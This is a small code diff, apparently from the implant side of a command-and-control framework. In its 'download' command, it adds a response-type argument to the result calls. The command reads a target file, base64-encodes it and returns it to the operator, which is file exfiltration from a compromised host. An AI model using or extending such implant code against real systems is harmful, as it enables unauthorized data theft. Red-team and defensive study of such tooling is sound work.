@@ -22,13 +22,13 @@ namespace Engineer.Commands
                 if (task.Arguments.TryGetValue("/file", out string file))
                 {
                     byte[] content = File.ReadAllBytes(file);
-                    Tasking.FillTaskResults(Convert.ToBase64String(content),task, EngTaskStatus.Complete);
+                    Tasking.FillTaskResults(Convert.ToBase64String(content),task, EngTaskStatus.Complete,TaskResponseType.String);
                 }
-                Tasking.FillTaskResults("missing /file argument for download target",task,EngTaskStatus.FailedWithWarnings);
+                Tasking.FillTaskResults("missing /file argument for download target",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
             }
             catch (Exception ex)
             {
-                Tasking.FillTaskResults("error: " + ex.Message,task,EngTaskStatus.Failed);
+                Tasking.FillTaskResults("error: " + ex.Message,task,EngTaskStatus.Failed,TaskResponseType.String);
             }
 
         }
